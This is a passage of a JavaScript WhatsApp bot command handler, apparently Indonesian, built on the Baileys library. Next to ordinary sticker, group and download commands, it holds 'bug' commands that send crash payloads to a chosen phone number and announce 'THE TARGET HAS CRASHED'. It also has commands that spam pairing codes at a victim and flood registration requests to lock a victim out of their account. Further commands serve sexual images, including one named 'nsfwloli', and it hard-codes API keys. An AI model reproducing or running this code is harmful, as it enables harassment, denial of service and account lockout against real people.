                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyzz("Success")
                }
                break
                
                case 'hdr':
  case 'remini':{
if (!quoted) return replyzz(`Where is the picture?`)
			if (!/image/.test(mime)) return replyzz(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			replyzz(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			krocov4.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
			} catch {
			  replyzz('yah eror kak')
			}
			}
			break
                
            case 'delprem':
                if (!isCreator) return replyzz(mess.owner)
                if (args.length < 1) return replyzz(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyzz("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyzz("Success")
                }
                break
                
            case 'autoread':
                if (!isCreator) return replyzz(mess.owner)
                if (args.length < 1) return replyzz(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyzz(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyzz(`Successfully changed autoread to ${q}`)
                }
                break
                
            case 'kick':
                if (!m.isGroup) return replyzz(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyzz(mess.admin)
                if (!isBotAdmins) return replyzz(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await krocov4.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyzz(json(res))).catch((err) => replyzz(json(err)))
                break
                
                case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return replyzz(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break
                
            case 'add':
                if (!m.isGroup) return replyzz(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyzz(mess.admin)
                if (!isBotAdmins) return replyzz(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await krocov4.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyzz(json(res))).catch((err) => replyzz(json(err)))
                break
            case 'hidetag':
                if (!m.isGroup) return replyzz(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyzz(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyzz(mess.botAdmin)
                krocov4.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
                
                case 'trap' :
if (!isPremium) return
replyzz(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPremium) return
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPremium) return
replyzz(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPremium) return
replyzz(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!isPremium) return
replyzz(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await krocov4.sendMessage(m.chat, { caption:  `Ini dia!!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
break
case 'ahegao':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai': {
async function nhentaiScraper(id) {
	let uri = id ? `https://cin.guru/v/${+id}/` : 'https://cin.guru/'
	let html = (await axios.get(uri)).data
	return JSON.parse(html.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]).props.pageProps.data
}
function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
let code = (args[0] || '').replace(/\D/g, '')
if (!code) return reply('Input code')
	await reply('_In progress, please wait..._')
let data = await nhentaiScraper(code)
let pages = []
let thumb = `https://external-content.duckduckgo.com/iu/?u=https://t.nhentai.net/galleries/${data.media_id}/thumb.jpg`	
data.images.pages.map((v, i) => {
			let ext = new URL(v.t).pathname.split('.')[1]
			pages.push(`https://external-content.duckduckgo.com/iu/?u=https://i7.nhentai.net/galleries/${data.media_id}/${i + 1}.${ext}`)
		})
let buffer = await (await fetch(thumb)).buffer()		
let jpegThumbnail = await extractImageThumb(buffer)		
let imagepdf = await toPDF(pages)		
await krocov4.sendMessage(m.chat, { document: imagepdf, jpegThumbnail, fileName: data.title.english + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
} 
break
case 'jahy':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPremium) return
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
krocov4.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!isPremium) return
if (!AntiNsfw) return replyzz(mess.nsfw)
replyzz(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await krocov4.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!isPremium) return
if (!AntiNsfw) return replyzz(mess.nsfw)
replyzz(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/database/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await krocov4.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!isPremium) return
if (!AntiNsfw) return replyzz(mess.nsfw)
replyzz(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
krocov4.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
                
                case 'ip-info': {
if (!isPremium) return 
if (!q) return replyzz(`Example : \n\n*${prefix + command} 8.8.8.8.8*`)
try {
    let data = await (await fetch(`https://ipinfo.io/${q}/json?token=2a3885ed5be29e`)).json()
    let [latitude, longitude] = data.loc.split(',')
    let continentCode = { "US": "NA", "BR": "SA", "CN": "AS", "IN": "AS", "RU": "EU" }[data.country] || 'Unknown'

    replyzz(JSON.stringify({
        currentTime: new Date().toISOString(),
        countryCode: data.country,
        region: data.region,
        city: data.city,
        latitude,
        longitude,
        capital: data.capital || 'N/A',
        domain: data.hostname || 'N/A',
        id: data.ip,
        isp: data.org?.split(' ')[0] || 'N/A',
        org: data.org || 'N/A',
        callingCode: data.phone || 'N/A',
        continent: continentCode,
        type: q.includes(':') ? 'IPv6' : 'IPv4',
        asn: data.asn?.asn || 'N/A',
        abbr: data.country
    }, null, 2))
} catch (error) {
    console.error('Error fetching IP details:', error)
}
await reaction(m.chat, "✅")
}
break

case 'proxy-checker': {
if (!isPremium) return 
if (!q) return replyzz(`Example : \n\n*${prefix + command} 8.8.8.8.8*`)
replyzz(JSON.stringify(await fetch(`https://proxycheck.io/v2/${q}?key=88f203dba5d482cd6e45c0647b1d0ab4f99e3de78392b329357d6efcdd23e435`).then(res => res.json()).catch(error => `Error: ${error.message}`), null, 2))
}
break
                
                case 'inspect-web': {
    inireact();
    if (!q) return replyzz(`Example: ${m.prefix + m.command} https://www.nasa.gov/`);
    var response = await fetch(`https://dikaardnt.com/api/tool/inspect?url=${q}`);
    var data = await response.json();
    replyzz(`📝 URL: ${data.url}
    📖 Title: ${data.title}
    📝 Description: ${data.description}
    🔗 Links: ${data.links.join(', ')}
    🖼️ Image: ${data.image}
    📝 Content: ${data.content}
    👤 Author: ${data.author}
    🌐 Source: ${data.source}
    ⏲️ Time to Render: ${data.ttr} ms
    🔖 Type: ${data.type}`);
replyzz("An error occurred while fetching data. Please try again later.");
}
break
                
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyzz(`*[warning]* Reply atau kirim gambar dengan caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await krocov4.sendImageAsSticker(m.chat, media, m, {
                        packname: 'dibuat oleh bot',
                        author: 'AkmalMods'
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyzz('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await krocov4.sendVideoAsSticker(m.chat, media, m, {
                        packname: 'dibuat oleh bot',
                        author: 'youtube: AkmalMods'
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyzz(`*[kesalahan]* kirim gambar dengan caption ${prefix + command}\nminimal durasi 1/9 detik`)
                }
            }
            break
            
case 'mediafire': {
	if (args.length == 0) return replyzz(`Dimana linknya?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replyzz(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return replyzz('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replyzz(`${result4}`)
krocov4.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break

case 'bugmods': case 'flow': 
if (!isPremium) return replyzz(mess.prem)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz(bugres)
for (let i = 0; i < 20; i++) {
await buk1(krocov4, target, "p", 1020000, ptcp = true);
await beta2(krocov4, target, wanted)
await buk1(krocov4, target, "p", 1020000, ptcp = true);
await beta2(krocov4, target, wanted)
await buk1(krocov4, target, "p", 1020000, ptcp = true);
await beta2(krocov4, target, wanted)
await buk1(krocov4, target, "p", 1020000, ptcp = true);
await beta2(krocov4, target, wanted)
    }
    
    replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *NullBug*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
    
break

case 'apkcrash': {// android 10 keatas
if (!isPremium) return replyzz(mess.prem)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await replyzz(bugres)
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
await sleep(2000)
await callp(target, )
await callp(target, )
for (let i = 0; i < 20; i++) {
await callp(target, freesex)
}
    
    await replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *${command}*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    await krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
}
break

case 'injectorcrash': { // untuk semua versi android
if (!isPremium) return replyzz(mess.prem)
if (!q) return replyzz(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await replyzz(bugres)
await sleep(2000)
await gall(target, akmalbug, 1020000)
await callp(target, )
await callp(target, )
await gall(target, akmalbug, 350000)
await callp(target, )
await gall(target, akmalbug, 1020000)
await gall(target, akmalbug, 1020000)
await gall(target, akmalbug, 1020000)
    
    await replyzz(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
┏❐ 𝐓𝐀𝐑𝐆𝐄𝐓 : *@${target.split("@")[0]}*
┃𝐕𝐈𝐑𝐔𝐒 : *${command}*
┃THE TARGET HAS CRASHED
┃「 𝗡𝗼𝘁𝗲 」
┃Pause the bot for 10 minutes, So The Bot 
┃Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱
┗❐ 𝙏𝙃𝙀 𝙏𝘼𝙍𝙂𝙀𝙏 𝙃𝘼𝙎 𝘾𝙍𝘼𝙎𝙃𝙀𝘿 ‹›`);
    
    await krocov4.sendMessage(m.chat, { audio: { url: audioFilePath }, mimetype: 'audio/mp4' }, { quoted: m });
}
break

          

            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyzz(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyzz(`Example : ${prefix + command} 😅+🤔`)
                replyzz(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await krocov4.sendImageAsSticker(m.chat, res.url, m, {
                        packname: 'dibuat oleh bot',
                        author: 'youtube: AkmalMods',
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            
        case 'spam-pair': {
    if (!isPremium) return replyzz("Fitur ini hanya untuk pengguna Premium.");
    if (!q) return replyzz(`Contoh: ${prefix + command} +62 882-2132-5473`);

    await reaction(m.chat, "✅");
    let target = q.replace(/[^0-9]/g, '').trim();

    // Import modul yang dibutuhkan
    let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
    let { state } = await useMultiFileAuthState('session');
    let { version } = await fetchLatestBaileysVersion();

    // Buat koneksi ke WhatsApp
    let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });

    // Loop untuk spam pairing code
    for (;;) {
        for (let i = 0; i < 20; i++) {  // Loop untuk spam, 20 kali
            await sleep(3000);  // Delay 3 detik
            try {
                let prc = await sucked.requestPairingCode(target);
                console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`);
                
                // Mengirim notifikasi ke target
                await sucked.sendMessage(target, { text: `Pairing Code: ${prc}` });
            } catch (error) {
                console.error(`Error pada request pairing code: ${error}`);
                if (error.message.includes("Connection Closed")) {
                    // Jika koneksi tertutup, berhenti dan log error
                    console.log("Koneksi tertutup, mencoba reconnect...");
                    break;
                }
            }
        }
        await sleep(60000);  // Delay 1 menit sebelum mulai ulang loop
    }
}
break

case "iosfreze": {
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`🐉 𝐁𝐮𝐤𝐚𝐧 𝐆𝐢𝐭𝐮 𝐓𝐚𝐩𝐢\n ${prefix + command} 62xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz("𝐏𝐫𝐨𝐬𝐞𝐬𝐬〽️")
for (let i = 0; i < 10; i++) {
await XiosPay(X)
await XiosVirus(X)
await TxIos(X, Ptcp = true)
await sleep(1)
}
krocov4.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break

case "kangcrot": {
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`🐉 𝐁𝐮𝐤𝐚𝐧 𝐆𝐢𝐭𝐮 𝐓𝐚𝐩𝐢\n ${prefix + command} 62xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz("𝐏𝐫𝐨𝐬𝐞𝐬𝐬〽️")
for (let i = 0; i < 20; i++) {
await TxOs(X, Ptcp = true)
}
for (let i = 0; i < 2; i++) {
await sendCrash(X)
await StuckNull(X, mods, Ptcp = true)
await StuckSql(X, mods, Ptcp = true)
await Tedex(X, dottm)
}
for (let i = 0; i < 1; i++) {
await TrashSystem(X, mods, Ptcp = true)
}
for (let i = 0; i < 1; i++) {
await sendCrash(X)
}
krocov4.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break
            
case 'lockwa': {
 if (!isCreator) return replyzz(mess.owner)
if (!text) return replyzz(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return replyzz(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
let numbers = JSON.parse(fs.readFileSync('./database/tempban.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await replyzz(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tempban.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'betawhatbug': {
if (!isCreator) return replyzz(mess.owner)
if (!q) return replyzz(`<!> Perintah Tidak Valid!\n\n[ Penggunaan .${command} 628123456789 ]`)
inireact(randomemoji)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyzz(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628123456789`)
  let target = bijipler + '@s.whatsapp.net'
await krocov4.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "⭑̤⟅̊༑ 𝐓͜͡𝐝͜𝐗͡🚯⃟ꢵ 𝐓͜͡𝐑͡𝚫͜͡𝐒͜𑪋͜͝𝐇͡ 𝐃͜𝐢͡𝐕͜𝐢͡𝐒͜𝐢𝐎͜͡𝐍͡  ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
locationMessage: {},
hasMediaAttachment: true,
},
body: {
text: "",
},
carouselMessage: {}
}
}
}
}, { participant: { jid: target } })
await krocov4.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
ImageMessage: {},
title: "⭑̤⟅̊༑ 𝐓͜͡𝐝͜𝐗͡🚯⃟ꢵ 𝐓͜͡𝐑͡𝚫͜͡𝐒͜𑪋͜͝𝐇͡ 𝐃͜𝐢͡𝐕͜𝐢͡𝐒͜𝐢𝐎͜͡𝐍͡  ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
hasMediaAttachment: true,
},
body: {
text: "",
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "payment_info",
buttonParamsJson: `{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"X\",\"key\":\"+9999999999\",\"key_type\":\"999999999\"}}]}`
}
]
}
}
}
}
